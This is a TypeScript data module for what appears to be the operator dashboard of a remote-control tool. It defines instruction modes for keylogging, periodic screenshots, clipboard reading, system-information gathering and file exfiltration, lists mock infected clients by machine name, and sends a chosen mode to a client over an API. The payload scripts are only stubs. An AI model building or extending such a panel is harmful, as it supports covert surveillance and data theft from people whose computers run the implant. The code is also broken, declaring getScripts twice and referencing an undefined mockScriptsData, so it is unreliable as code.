// Mock scripts data to use when API is not available
export interface ScriptsData {
  [key: string]: string;
}

export interface InstructionType {
  id: string;
  name: string;
  description: string;
  code: string;
}

export interface ClientInstruction {
  id: string;
  name: string;
  system: string;
  currentInstruction: string;
  lastActivity: string;
}

// Mock instructions parsed from instructions.py
const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
  "standard": "Standardinstruktion för klippbordsavläsning",
  "keylogger": "Registrerar tangentbordstryckningar",
  "screenshot": "Tar skärmdumpar periodiskt",
  "system_info": "Samlar in systeminformation",
  "file_exfiltration": "Söker och skickar specifika filer"
};

// Mock client data (in a real app this would come from an API)
const MOCK_CLIENTS: ClientInstruction[] = [
  {
    id: "1",
    name: "wickey",
    system: "DESKTOP-HKQH9A7",
    currentInstruction: "screenshot",
    lastActivity: "2025-03-18 18:03:05"
  },
  {
    id: "2",
    name: "wickey_desktop-hkqh9a7",
    system: "DESKTOP-HKQH9A7",
    currentInstruction: "standard",
    lastActivity: "2025-03-18 04:50:51"
  }
];

// Get available scripts from the server or use mock data if API fails
export async function getScripts(): Promise<ScriptsData> {
  try {
    const response = await fetch('/api/scripts');
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Error fetching scripts:", error);
    
    // Use local data from instructions.py if API fails
    const scripts = await extractScriptsFromInstructionsPy();
    return scripts;
  }
}

// Extract scripts from instructions.py
export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
  // In a real app, this would parse the Python file server-side
  // For now, we're returning mock data based on the file content
  try {
    // Import the instructions.py data
    // This is a mock - in a real app, this would be a proper API call
    const response = await import('../scripts/instructions.py');
    console.log("Mock import of instructions.py");
    
    // Mock data extraction from instructions.py
    return {
      "standard": "# Standard instruktioner - logga tangenttryckningar\nimport platform\nimport getpass\n# ... more code here",
      "keylogger": "# Instruktion: Keylogger-läge - Registrera och skicka tangenttryckningar\nimport platform\nimport getpass\n# ... more code here",
      "screenshot": "# Instruktion: Screenshot-läge - Ta och skicka skärmdumpar\nimport platform\nimport getpass\n# ... more code here",
      "system_info": "# Instruktion: System Info-läge - Samla och skicka systeminformation\nimport platform\nimport getpass\n# ... more code here",
      "file_exfiltration": "# Instruktion: File Exfiltration-läge - Hitta och exfiltrera specifika filtyper\nimport platform\nimport getpass\n# ... more code here",
    };
  } catch (error) {
    console.error("Error extracting scripts:", error);
    // Fallback to hard-coded values if import fails
    return {
      "standard": "# Standard instruktioner - logga tangenttryckningar",
      "keylogger": "# Instruktion: Keylogger-läge",
      "screenshot": "# Instruktion: Screenshot-läge",
      "system_info": "# Instruktion: System Info-läge",
      "file_exfiltration": "# Instruktion: File Exfiltration-läge",
    };
  }
}

// Get all available instruction types
export async function getInstructionTypes(): Promise<InstructionType[]> {
  const scripts = await extractScriptsFromInstructionsPy();
  
  return Object.keys(scripts).map(key => ({
    id: key,
    name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
    description: INSTRUCTION_DESCRIPTIONS[key] || key,
    code: scripts[key]
  }));
}

// Get all clients and their current instructions
export async function getClients(): Promise<ClientInstruction[]> {
  try {
    const response = await fetch('/api/clients');
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return await response.json();
  } catch (error) {
    console.error("Error fetching clients:", error);
    // Return mock data
    return MOCK_CLIENTS;
  }
}

// Update a client's instruction
export async function updateClientInstruction(clientId: string, instructionId: string): Promise<boolean> {
  try {
    const response = await fetch(`/api/clients/${clientId}/instruction`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ instruction: instructionId }),
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    return true;
  } catch (error) {
    console.error("Error updating client instruction:", error);
    // Mock success for demo purposes
    return true;
  }
}

/**
 * Get scripts data
 * @returns {Promise<ScriptsData>} The scripts data
 */
export const getScripts = async (): Promise<ScriptsData> => {
  try {
    const response = await fetch('/api/scripts');
    
    if (!response.ok) {
      throw new Error(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
    }
    
    try {
      const data = await response.json();
      return data;
    } catch (error) {
      console.warn("API returned non-JSON response, using mock data instead");
      return mockScriptsData;
    }
  } catch (error) {
    console.warn("Failed to fetch from API, using mock data instead:", error);
    return mockScriptsData;
  }
};
